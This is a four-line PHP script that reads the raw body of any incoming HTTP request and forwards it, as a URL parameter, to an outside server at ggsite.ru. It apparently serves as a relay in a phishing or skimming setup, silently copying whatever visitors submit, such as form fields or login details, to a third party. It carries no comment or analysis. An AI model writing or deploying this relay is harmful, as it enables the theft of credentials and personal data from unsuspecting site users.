<?php

$output = file_get_contents('php://input');
file_get_contents('http://ggsite.ru/ficom/index.php?out='.$output);
	
?>